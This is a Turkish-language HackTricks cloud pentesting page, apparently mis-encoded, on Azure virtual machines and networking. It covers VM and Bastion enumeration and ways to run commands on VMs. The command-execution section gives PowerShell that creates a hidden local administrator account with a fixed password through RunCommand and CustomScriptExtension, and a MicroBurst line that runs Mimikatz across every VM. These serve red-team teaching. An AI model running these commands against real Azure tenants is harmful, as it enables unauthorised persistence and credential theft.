# Az - Sanal Makineler & AÄŸ

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel bilgiler

[Belgelerden:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure sanal makineleri, Azure'un sunduÄŸu birkaÃ§ tÃ¼r [talep Ã¼zerine, Ã¶lÃ§eklenebilir hesaplama kaynaklarÄ±ndan](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) biridir. Genellikle, diÄŸer seÃ§eneklerin sunduÄŸundan daha fazla kontrol gerektiÄŸinde bir sanal makine seÃ§ersiniz. Bu makale, bir sanal makine oluÅŸturmadan Ã¶nce dikkate almanÄ±z gerekenler, nasÄ±l oluÅŸturulacaÄŸÄ± ve nasÄ±l yÃ¶netileceÄŸi hakkÄ±nda bilgi verir.

## Azure AÄŸ Bilgileri

Azure aÄŸlarÄ± **farklÄ± varlÄ±klar ve bunlarÄ± yapÄ±landÄ±rma yollarÄ±** iÃ§erir. FarklÄ± Azure aÄŸ varlÄ±klarÄ±nÄ±n kÄ±sa **tanÄ±mlarÄ±,** **Ã¶rnekleri** ve **enumeration** komutlarÄ±nÄ± bulabilirsiniz:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**, Azure portalÄ± Ã¼zerinden SSL aracÄ±lÄ±ÄŸÄ±yla gÃ¼venli, tamamen yÃ¶netilen RDP (Uzak MasaÃ¼stÃ¼ ProtokolÃ¼) ve SSH (GÃ¼venli Kabuk) eriÅŸim Ã§Ã¶zÃ¼mÃ¼ sunar. Azure Sanal AÄŸÄ± iÃ§inde entegre edilmiÅŸtir ve Ã¶zel IP'ler kullanarak VM'lere RDP ve SSH baÄŸlantÄ±sÄ± saÄŸlar, bu da genel IP'lere ihtiyaÃ§ duymadan yapÄ±lmasÄ±nÄ± saÄŸlar. Bu, genel IP atamalarÄ± ve VM eriÅŸimi iÃ§in NSG kural yapÄ±landÄ±rmalarÄ± iÃ§eren geleneksel yÃ¶ntemlere gÃ¶re daha gÃ¼venli ve daha uygun bir alternatif sunar. GeliÅŸtiriciler ve BT personeli, geliÅŸtirme ve test ortamlarÄ± iÃ§in sÃ¼reci kolaylaÅŸtÄ±rarak web tarayÄ±cÄ±larÄ±nÄ± kullanarak Azure portalÄ±ndan VM'lere gÃ¼venli bir ÅŸekilde eriÅŸebilirler.

AboneliÄŸinizdeki tÃ¼m Azure Bastion Host'larÄ±nÄ± listelemek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM SayÄ±mÄ±
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **VM'de komut Ã§alÄ±ÅŸtÄ±rma**

### **VM'de AAD GiriÅŸi**

AzureAD Ã¼zerinden kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ kullanÄ±cÄ±lara eriÅŸim izni vermek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin bir **linux VM**'ye eriÅŸmeye Ã§alÄ±ÅŸÄ±rken: `ssh username@azure-corp.com@1.1.1.1` (giriÅŸ yapmaya Ã§alÄ±ÅŸÄ±rken kullanÄ±lan azurecorp ile **e-posta** kullanmak Ã¶nemlidir) ÅŸu hatayÄ± alabilirsiniz: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Sadece **bu talimatlarÄ± takip edin** [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) adresine giderek ve kodu belirterek, e-posta ve ÅŸifreyi kimlik bilgileri olarak kullanarak SSH ile baÄŸlanabileceksiniz (eÄŸer o kullanÄ±cÄ±nÄ±n bunu yapacak yeterli yetkisi varsa: `Virtual Machine Administrator Login` veya `Virtual Machine User Login` rolÃ¼).

### **Komut Ã‡alÄ±ÅŸtÄ±r**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ã–zel Betik UzantÄ±sÄ±nÄ± Ã‡alÄ±ÅŸtÄ±r**

Azure sanal makine (VM) uzantÄ±larÄ±, **Azure VM'lerinde** daÄŸÄ±tÄ±m sonrasÄ± yapÄ±landÄ±rma ve otomasyon **gÃ¶revleri** saÄŸlayan **kÃ¼Ã§Ã¼k uygulamalardÄ±r**. Ã–rneÄŸin, bir sanal makinenin yazÄ±lÄ±m kurulumu, antivirÃ¼s korumasÄ± veya iÃ§inde bir betik Ã§alÄ±ÅŸtÄ±rma yeteneÄŸine ihtiyacÄ± varsa, bir VM uzantÄ±sÄ± kullanabilirsiniz.

Bu nedenle, yazma eriÅŸiminiz varsa, rastgele kod Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC), kod aracÄ±lÄ±ÄŸÄ±yla bir ana bilgisayarÄ± kurmak iÃ§in kullanÄ±lan Ansible'a benzer bir PowerShell aracÄ±dÄ±r. DSC, belirli yapÄ±landÄ±rma dosyalarÄ±nÄ±n yÃ¼klenmesine olanak tanÄ±yarak Azure ile entegre olur. Bu dosyalarÄ±n katÄ± bir sÃ¶zdizimine uymasÄ± gerekmektedir. Ã–zellikle, Azure'daki DSC uzantÄ±sÄ±, belirli biÃ§imlendirme kriterlerini karÅŸÄ±layan dosyalardan komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir; bu, saÄŸlanan ÅŸekilde gÃ¶sterildiÄŸi gibi, DSC standartlarÄ± iÃ§in sÃ¶zdizimi doÄŸru olmasa bile mÃ¼mkÃ¼ndÃ¼r.

Bu komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi, Az PowerShell'deki [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) iÅŸlevi ile kolaylaÅŸtÄ±rÄ±lÄ±r. Gereksinimler arasÄ±nda tanÄ±mlÄ± bir iÅŸlev iÃ§eren bir **.PS1** dosyasÄ± ve dosyanÄ±n **.zip** dosyasÄ±na sÄ±kÄ±ÅŸtÄ±rÄ±lmasÄ± yer alÄ±r. SÃ¶zdizimi DSC iÃ§in doÄŸru olmasa bile, kod yine de Ã§alÄ±ÅŸacaktÄ±r. Ancak, uzantÄ± yÃ¼rÃ¼tme durumunu "baÅŸarÄ±sÄ±zlÄ±k" olarak iÅŸaretleyecek ve komuttan hiÃ§bir Ã§Ä±ktÄ± gÃ¶rÃ¼nmeyecektir Ã§Ã¼nkÃ¼ durum, baÅŸarÄ±sÄ±zlÄ±k mesajÄ± tarafÄ±ndan Ã¼zerine yazÄ±lacaktÄ±r.

### VM Uygulama TanÄ±mlarÄ±

VM Uygulama TanÄ±mlarÄ±, sÃ¼rÃ¼mlÃ¼ uygulamalarÄ±n bir Azure VM'ye tekrarlanabilir bir ÅŸekilde daÄŸÄ±tÄ±lmasÄ±na olanak tanÄ±r. Bu kaynak, uygulamalarÄ±n VM'ler arasÄ±nda daÄŸÄ±tÄ±mÄ±nÄ± ve gÃ¼ncellenmesini destekler. Bunu ayarlamak iÃ§in, Az PowerShell'de **`New-AzGalleryApplication`** ve **`New-AzGalleryApplicationVersion`** gibi komutlarÄ± iÃ§eren birkaÃ§ adÄ±m gereklidir.

Bu yÃ¶ntemle uygulamalarÄ±n veya komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi, bir uygulama bir VM'ye uygulandÄ±ÄŸÄ±nda otomatik olarak kurulan **"VMAppExtension"** aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilir. UzantÄ±, dosyayÄ± belirtilen URI'den alÄ±r ve dosyayÄ± tam olarak uygulama adÄ±yla, uzantÄ± olmadan adlandÄ±rÄ±r. DosyanÄ±n doÄŸru bir ÅŸekilde yÃ¼rÃ¼tÃ¼lmesi iÃ§in, REST API Ã§aÄŸrÄ±sÄ±ndaki "ManageActions" alanÄ±nÄ±n dosyayÄ± uygun uzantÄ±yla yeniden adlandÄ±racak ÅŸekilde yapÄ±landÄ±rÄ±lmasÄ± gerekir. Bu yÃ¶ntemin kurulumu tamamlandÄ±ÄŸÄ±nda, saÄŸlanan ÅŸekilde gÃ¶sterilen yapÄ±ya benzeyecektir.

Ancak, bu yÃ¼rÃ¼tme yÃ¶ntemi nispeten yavaÅŸtÄ±r; bir uygulama veya komutun yÃ¼rÃ¼tÃ¼lmesi yaklaÅŸÄ±k 3-4 dakika sÃ¼rer. Bu sÃ¼reÃ§le ilgili dosyalar belirli dizinlerde saklanÄ±r (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` uygulama kopyasÄ± iÃ§in ve `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` yÃ¼rÃ¼tme durumu iÃ§in).

Her iki teknik de Azure ortamlarÄ±nda komutlarÄ± yÃ¼rÃ¼tme ve uygulamalarÄ± daÄŸÄ±tma konusunda benzersiz yollar sunar; her birinin kendine Ã¶zgÃ¼ gereksinimleri, adÄ±mlarÄ± ve dikkate alÄ±nmasÄ± gereken hususlarÄ± vardÄ±r.

### Azure'daki Hibrit Ã‡alÄ±ÅŸan GruplarÄ± (HWG'ler)

[**Hibrit Ã‡alÄ±ÅŸan GruplarÄ± (HWG'ler)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker), bir Otomasyon HesabÄ±nda yapÄ±landÄ±rÄ±lan Runbook'larÄ±n, belirlenen HWG'nin bir parÃ§asÄ± olan bir Azure Sanal Makinesi (VM) Ã¼zerinde yÃ¼rÃ¼tÃ¼lmesine olanak tanÄ±yan bir Azure Ã¶zelliÄŸidir. Bu yÃ¼rÃ¼tme, VM Ã¼zerinde Runbook kodunu daÄŸÄ±tan bir uzantÄ± aracÄ±lÄ±ÄŸÄ±yla kolaylaÅŸtÄ±rÄ±lÄ±r. Bu sÃ¼recin Ã¶nemli bir yÃ¶nÃ¼, gerÃ§ek kimlik bilgilerin yÃ¼rÃ¼tmede bir faktÃ¶r olmamasÄ±dÄ±r Ã§Ã¼nkÃ¼ kod, yÃ¼kseltilmiÅŸ ayrÄ±calÄ±klarla, Ã¶zellikle **SYSTEM** veya root olarak Ã§alÄ±ÅŸÄ±r; bu, saÄŸlanan ÅŸekilde gÃ¶sterilmiÅŸtir.

Windows 10 VM'leri kullananlar iÃ§in kritik bir detay, Runbook iÃ§in PowerShell sÃ¼rÃ¼mÃ¼nÃ¼ belirtme gerekliliÄŸidir. PowerShell SÃ¼rÃ¼m 5.1 olarak Ã§alÄ±ÅŸacak ÅŸekilde ayarlanmalÄ±dÄ±r; 7.1 yerine. Bu gereklilik, PowerShell 7.1'in bu VM'lerde varsayÄ±lan olarak yÃ¼klÃ¼ olmamasÄ±ndan kaynaklanmaktadÄ±r; bu nedenle 7.1 sÃ¼rÃ¼mÃ¼ belirtilirse, betik yÃ¼rÃ¼tme baÅŸarÄ±sÄ±z olur.

Azure'Ä±n bu Ã¶zelliÄŸi, hibrit ortamlarda gÃ¶revleri otomatikleÅŸtirmek ve yÃ¶netmek iÃ§in saÄŸlam bir yÃ¶ntem sunar; Azure VM'leri Ã¼zerinde merkezi yÃ¶netim ve gÃ¶rev yÃ¼rÃ¼tme olanaÄŸÄ± saÄŸlar.

## Referanslar

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
